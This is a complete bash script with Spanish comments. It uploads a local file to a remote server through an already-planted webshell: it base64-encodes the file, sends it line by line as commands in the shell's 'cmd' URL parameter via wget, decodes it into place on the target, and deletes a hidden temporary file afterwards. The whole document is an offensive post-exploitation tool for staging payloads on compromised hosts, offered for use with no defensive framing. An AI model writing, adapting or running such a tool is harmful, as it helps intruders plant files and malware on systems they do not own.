#!/bin/bash

# comprobacion de parametros
if [ $# -ne 3 ]
then
        echo "usa: $0 <url> <fich orig> <fich dest>"
        exit -1
fi

# parametros de entrada
url=$1
fi=$2
fo=$3

# constantes constantes
tmpfile='/tmp/.uws_b64'

# ejecuta remotamente via webshell
function wsh
{
        # ejecuta remotamente
        wget -q --no-check-certificate -O /dev/null "$url?cmd=$1"

        # error ?
        if [ $? -ne 0 ]
        then
                echo 'error: fallo de conexion!'
                exit -1
        fi
}

# existe el fichero ?
if [ ! -e $fi ]
then
        echo 'error: fichero no existe!'
        exit -1
fi

echo -n "Subiendo fichero"

# creamo fichero en destino
wsh "> $tmpfile"

# codificamos y enviamos linea a linea
for l in `uuencode -m $fi $fo | sed -e 's/ /_/g'`
do
        l=`echo $l | sed -e 's/\+/%2b/g' -e 's/_/ /g'`
        wsh "echo $l >> $tmpfile"
        echo -n '.'
done

# decodificamos b64 a binario
wsh "uudecode $tmpfile"

# borramos temporales
wsh "rm $tmpfile"

# fin 
echo ' hecho!'

